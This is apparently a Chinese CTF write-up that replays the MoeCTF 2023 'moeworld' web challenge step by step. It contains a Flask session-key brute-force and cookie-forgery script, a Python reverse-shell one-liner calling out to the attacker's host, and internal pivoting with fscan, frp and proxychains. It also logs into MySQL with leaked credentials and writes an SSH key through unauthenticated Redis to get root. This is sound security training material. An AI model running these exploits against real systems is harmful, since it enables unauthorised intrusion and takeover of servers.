---
title: MoeCTF 2023 Web 部分复现
date: '2023/11/18 16:05:01'
categories:
  - - ctf
description: MoeCTF 2023 Web 部分复现
tags:
abbrlink:
---

# MoeCTF 2023 Web 部分复现
## moeworld 

### 攻击公网服务器

打开页面是一个登录界面，创建一个账号进去之后，发现有提示
```shell
flask框架
而且session的密钥为 app.secret_key = "This-random-secretKey-you-can't-get" + os.urandom(2).hex()
```

session的密钥只有两位随机，猜测可以爆破，考虑 flask session 伪造

#### flask session 伪造
使用工具 [flask-session-cookie-manager](https://github.com/noraj/flask-session-cookie-manager)

编写 python 脚本爆破
这里是在 ```flask_session_cookie_manager3.py``` 文件的部分代码基础上，进行了修改
```python
#!/usr/bin/env python3

# standard imports
import sys
import zlib
from itsdangerous import base64_decode
import ast
import itertools

# Abstract Base Classes (PEP 3119)
if sys.version_info[0] < 3: # < 3.0
    raise Exception('Must be using at least Python 3')
elif sys.version_info[0] == 3 and sys.version_info[1] < 4: # >= 3.0 && < 3.4
    from abc import ABCMeta, abstractmethod
else: # > 3.4
    from abc import ABC, abstractmethod

# Lib for argument parsing
import argparse

# external Imports
from flask.sessions import SecureCookieSessionInterface

class MockApp(object):

    def __init__(self, secret_key):
        self.secret_key = secret_key


if sys.version_info[0] == 3 and sys.version_info[1] < 4: # >= 3.0 && < 3.4
    class FSCM(metaclass=ABCMeta):
        def encode(secret_key, session_cookie_structure):
            """ Encode a Flask session cookie """
            try:
                app = MockApp(secret_key)

                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
                si = SecureCookieSessionInterface()
                s = si.get_signing_serializer(app)

                return s.dumps(session_cookie_structure)
            except Exception as e:
                return "[Encoding error] {}".format(e)
                raise e


        def decode(session_cookie_value, secret_key=None):
            """ Decode a Flask cookie  """
            try:
                if(secret_key==None):
                    compressed = False
                    payload = session_cookie_value

                    if payload.startswith('.'):
                        compressed = True
                        payload = payload[1:]

                    data = payload.split(".")[0]

                    data = base64_decode(data)
                    if compressed:
                        data = zlib.decompress(data)

                    return data
                else:
                    app = MockApp(secret_key)

                    si = SecureCookieSessionInterface()
                    s = si.get_signing_serializer(app)

                    return s.loads(session_cookie_value)
            except Exception as e:
                return "[Decoding error] {}".format(e)
                raise e
else: # > 3.4
    class FSCM(ABC):
        def encode(secret_key, session_cookie_structure):
            """ Encode a Flask session cookie """
            try:
                app = MockApp(secret_key)

                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
                si = SecureCookieSessionInterface()
                s = si.get_signing_serializer(app)

                return s.dumps(session_cookie_structure)
            except Exception as e:
                return "[Encoding error] {}".format(e)
                raise e


        def decode(session_cookie_value, secret_key=None):
            """ Decode a Flask cookie  """
            try:
                if(secret_key==None):
                    compressed = False
                    payload = session_cookie_value

                    if payload.startswith('.'):
                        compressed = True
                        payload = payload[1:]

                    data = payload.split(".")[0]

                    data = base64_decode(data)
                    if compressed:
                        data = zlib.decompress(data)

                    return data
                else:
                    app = MockApp(secret_key)

                    si = SecureCookieSessionInterface()
                    s = si.get_signing_serializer(app)

                    return s.loads(session_cookie_value)
            except Exception as e:
                return "[Decoding error] {}".format(e)
                raise e



# 下面的代码用于爆破 cookie 得到 key

content = "{\"power\":\"guest\",\"user\":\"test\"}"

cookie = "eyJwb3dlciI6Imd1ZXN0IiwidXNlciI6InRlc3QifQ.ZTeojg.afpjfgsgpwulaVEE6liXb7Um4P8"

# 生成所有可能的两个字节的组合，以字符串形式
for combination in itertools.product(range(256), repeat=2):
    key = ''.join(f'{byte:02x}' for byte in combination)
    result = FSCM.decode(cookie, "This-random-secretKey-you-can't-get" + key)
    if "test" in str(result):
        print("This-random-secretKey-you-can't-get" + key)
        print(result)

# 下面的代码用于生成 cookie
key = "This-random-secretKey-you-can't-get9777"
content = "{\"power\":\"admin\",\"user\":\"admin\"}"
result = FSCM.encode(key, content)
print(result)
```

刷新一下，用 burpsuite 抓包，用生成的 cookie 替换原来 cookie ，发现有新的帖子提示
```shell
今天测试留言板的时候发现我的调试模式给出的pin码一直是119-692-758不变，真是奇怪呢
不过这个泄露了貌似很危险，别人就可以进我的console执行任意python代码了
```

得到提示在地址栏输入 http://192.168.179.128:8000/console ，进入 console，输入 pin 码

#### 反弹shell

kali 进行监听
```shell
nc -lvvp 2223 
```
在console输入
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.179.129",2223));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

在根目录发现部分 flag 
```shell
moectf{Information-leakage-Is-dangerous!
```

还有 readme 的内容
```shell
恭喜你通过外网渗透拿下了本台服务器的权限
接下来，你需要尝试内网渗透，本服务器的/app/tools目录下内置了fscan
你需要了解它的基本用法，然后扫描内网的ip段
如果你进行了正确的操作，会得到类似下面的结果
10.1.11.11:22 open
10.1.23.21:8080 open
10.1.23.23:9000 open
将你得到的若干个端口号从小到大排序并以 - 分割，这一串即为hint.zip压缩包的密码（本例中，密码为：22-8080-9000）
注意：请忽略掉xx.xx.xx.1，例如扫出三个ip 192.168.0.1 192.168.0.2 192.168.0.3 ，请忽略掉有关192.168.0.1的所有结果！此为出题人服务器上的其它正常服务
对密码有疑问随时咨询出题人$ 
```

### 攻击内网服务器

在刚刚得到的外网服务器上面，查看主机名与IP地址之间的映射关系
```shell
cat /etc/hosts
```

得到的内容如下
```shell
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.20.0.4      0bc78aa6bec8
172.21.0.3      0bc78aa6bec8
```

正常来说，这里需要使用扫描工具，本题中已经预设好了 ```fscan```，在 ```/app/tools``` 目录下
```shell
./fscan -h 172.20.0.4/24
```
但是我这里 ```fscan``` 没扫出来不知道什么情况，先往下走
参考一下别人的情况，如下
```shell
[*]Icmp alive hosts len is:4
172.20.0.4:8080 open
172.20.0.2:6379 open
172.20.0.3:3306 open
172.20.0.1:3306 open
172.20.0.1:80 open
172.20.0.2:22 open
172.20.0.1:22 open
172.20.0.1:21 open
172.20.0.1:888 open
172.20.0.1:7777 open
```

忽略掉 ```xx.xx.xx.1``` 后，开放的端口是：```8080 6379 3306 22```
压缩包 ```hint.zip``` 的密码是 ```22-3306-6379-8080```
```hint``` 的内容如下
```shell
当你看到此部分，证明你正确的进行了fscan的操作得到了正确的结果
可以看到，在本内网下还有另外两台服务器
其中一台开启了22(ssh)和6379(redis)端口
另一台开启了3306(mysql)端口
还有一台正是你访问到的留言板服务
接下来，你可能需要搭建代理，从而使你的本机能直接访问到内网的服务器
此处可了解nps和frp，同样在/app/tools已内置了相应文件
连接代理，推荐proxychains
对于mysql服务器，你需要找到其账号密码并成功连接，在数据库中找到flag2
对于redis服务器，你可以学习其相关的渗透技巧，从而获取到redis的权限，并进一步寻找其getshell的方式，最终得到flag3
```

#### FRP 配置代理

使用 FRP 配置代理的主要目的是将内部网络上的服务暴露到公共互联网上，以便外部用户可以访问这些服务

##### 配置服务器端

服务器端我这里配置在 kali 上面，正常来说的话应该是配置在自己的公网服务器上面，这里因为是本地复现，就水一点

下载 [frp](https://github.com/fatedier/frp/releases) ，然后解压
```shell
wget https://github.com/fatedier/frp/releases/download/v0.52.3/frp_0.52.3_linux_amd64.tar.gz
tar -zxvf frp_0.52.3_linux_amd64.tar.gz 
```

进入对应目录
```shell
cd frp_0.52.3_linux_amd64 
```

修改配置文件(frps.ini在最新版本里面被弃用了，直接修改frps.toml)
```shell
gedit frps.toml
```

frps.toml 内容如下
```shell
[common]
# frp监听的端口，默认是7000，可以改成其他的
bind_port = 7000
# 这个token之后在客户端会用到
token = 1234

# frp管理后台端口，请按自己需求更改
dashboard_port = 7500
# frp管理后台用户名和密码，请改成自己的
dashboard_user = admin
dashboard_pwd = admin
enable_prometheus = true

# frp日志配置
log_file = /var/log/frps.log
log_level = info
log_max_days = 3
```

然后运行 frps
```shell
sudo ./frps -c frps.toml
```

访问 ```127.0.0.1:7500``` 可以看到服务已经启动

##### 配置客户端

这里是对受控制的靶机，即已经被 getshell 的外网服务器，进行操作

本题的 ```/app/tools``` 里面已经给好了 ```frpc``` 和 ```frpc.ini```

直接修改 ```frpc.ini```，原内容如下
```shell
[common]
server_addr = x.x.x.x
server_port = 7000

[plugin_socks5]
type = tcp
remote_port = 7777
plugin = socks5
# plugin_user = abc
# plugin_passwd = abc
```

这里要加入 ssh 服务、mysql 服务、redis 服务和 socks5，修改后如下
```shell
[common]
server_addr = 192.168.179.129
server_port = 7000
token = 1234

# 配置ssh服务
[ssh]
type = tcp
local_ip = 172.20.0.2 
local_port = 22
remote_port = 6100

# 配置mysql服务
[mysql]
type = tcp
local_ip = 172.20.0.3 # 内网的某个开启mysql服务器的ip
local_port = 3306 # 内网的某个开启mysql服务器的端口
remote_port = 6300 # 将要转发到frp服务器端的某个端口

# 配置redis服务
[redis]
type = tcp
local_ip = 172.20.0.2
local_port = 6379
remote_port = 6400

[plugin_socks5]
type = tcp
remote_port = 7777
plugin = socks5
# plugin_user = abc
# plugin_passwd = abc
```

修改时候，这里使用 ```cat >> frpc.ini << EOF``` 命令，但是没有权限，参照别人的操作，在 ```/tmp``` 目录下创建 ```frpc.ini``` 进行操作

**注意：一定要把 frpc.ini 中的注释去掉，不然可能有奇奇怪怪的 bug**

然后在 ```/tmp``` 目录下运行
```shell
/app/tools/frpc -c ./frpc.ini
```

操作成功会显示如下
```shell
$ /app/tools/frpc -c ./frpc.ini
2023/10/26 23:36:27 [I] [service.go:299] [62036f73016466e5] login to server success, get run id [62036f73016466e5], server udp port [0]                                                                                                                                     
2023/10/26 23:36:27 [I] [proxy_manager.go:142] [62036f73016466e5] proxy added: [ssh mysql plugin_socks5 redis]
2023/10/26 23:36:27 [I] [control.go:172] [62036f73016466e5] [ssh] start proxy success
2023/10/26 23:36:27 [I] [control.go:172] [62036f73016466e5] [mysql] start proxy success
2023/10/26 23:36:27 [I] [control.go:172] [62036f73016466e5] [plugin_socks5] start proxy success
2023/10/26 23:36:27 [I] [control.go:172] [62036f73016466e5] [redis] start proxy success
```

因为在外部服务器的 ```/app/dataSql.py``` 目录中获取到了 ```mysql``` 的用户名和密码，如下
```shell
db = pymysql.connect(
                    host="mysql",  # 数据库地址
                    port=3306,  # 数据库端口
                    user="root",  # 数据库用户名
                    passwd="The_P0sswOrD_Y0u_Nev3r_Kn0w",  # 数据库密码
                    database="messageboard",  # 数据库名
                    charset='utf8'
                )
```

所以直接尝试登录 ```mysql```

#### proxychains 配置代理

情景：假如我的 frp 的服务器（就是自己的公网服务器）为 192.168.179.129，现在想用 kali 方便操作，需要在 kali 这样设置

修改 kali 的  ```/etc/proxychains4.conf``` 文件
```shell
gedit /etc/proxychains4.conf
```

在最底下加上
```shell
socks5 192.168.179.129 7777
```

然后使用 mysql 的账户密码连接
```shell
proxychains4 mysql -h 192.168.179.129 -P 6300  -uroot -pThe_P0sswOrD_Y0u_Nev3r_Kn0w
```

连上数据库之后，直接查询内容得到flag
```shell
SHOW DATABASES;
SELECT table_name, column_name FROM information_schema.columns WHERE table_schema = 'messageboard';
USE messageboard;
SELECT flag FROM flag;
```

得到 flag 的一部分 ```-Are-YOu-myS0L-MasT3r?-```

#### redis 写 ssh 秘钥

需要满足下面的条件：
1. 配置登录策略不当导致任意机器都可以登录 redis
2. 未设置密码或者设置弱口令
3. 开启了 ssh 服务
4. redis 服务需要 root 权限启动，并且安全模式 (protected-mode) 必须关闭

尝试连接 ```redis```，并使用 ```info``` 查询信息
```shell
proxychains4 redis-cli -h 192.168.179.129 -p 6400 
info
```

生成 ```ssh-rsa``` 密匙
```shell
ssh-keygen -t rsa  
```

这里文件名写了个 ```1``` ，passsphrase 写了个 ```123```
```shell
Generating public/private rsa key pair.
Enter file in which to save the key (/home/zhou/.ssh/id_rsa): 1
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in 1
Your public key has been saved in 1.pub
The key fingerprint is:
SHA256:GUG/obmQ2OILaH+k/Evq49NRgyvmrgS3DjBRpjHx7kI zhou@kali
The key's randomart image is:
+---[RSA 3072]----+
|+.o    .o        |
| B       o       |
|o .   . . o      |
| o   + + = o     |
|+Eo o * S .      |
|+= = = . .       |
|+oB *.. .        |
|o+.Bo+           |
| .***o.          |
+----[SHA256]-----+                         
```

然后导出 key（ ```\n\n``` 是为了防止乱码）
```shell
(echo -e "\n\n"; cat 1.pub; echo -e "\n\n") > key.txt
```

将生成的公钥写入 redis 服务器的内存之中
```shell
cat key.txt | proxychains4 redis-cli -h 192.168.179.129 -p 6400 -x set xxx	
```

出现 ok 表示成功
可以登录上去看一下
```shell
roxychains4 redis-cli -h 192.168.179.129 -p 6400
keys *
get xxx
```

可以看到有 ```xxx``` 键和对应的值，表示成功写入

设置路径，准备导出文件到磁盘.（本质是更改 redis 的备份路径）
```shell
config set dir /root/.ssh
```

设置文件名（不能改成其他的）并导出
```shell
config set dbfilename authorized_keys
save
```

现在尝试连接 ssh
```shell
proxychains4 ssh -i 1 -p 6100 root@192.168.179.129
```
这里的 ```-i``` 参数后面的 ```1```，是前面生成 ```ssh-rsa``` 密匙的文件名 ```1```，```passsphrase``` 是前面生成 ```ssh-rsa``` 密匙时候填写的 ```passsphrase```，即 ```123```

到此成功连上 ssh

在根目录获取到最后一部分 flag ```P@sSW0Rd-F0r-redis-Is-NeceSsary}```


本部分参考：[渗透测试之地基服务篇：服务攻防之数据库Redis（上）](https://blog.csdn.net/wangluoanquan111/article/details/132023590)

flag 三部分组合起来是 ```moectf{Information-leakage-Is-dangerous!-Are-YOu-myS0L-MasT3r?-P@sSW0Rd-F0r-redis-Is-NeceSsary}```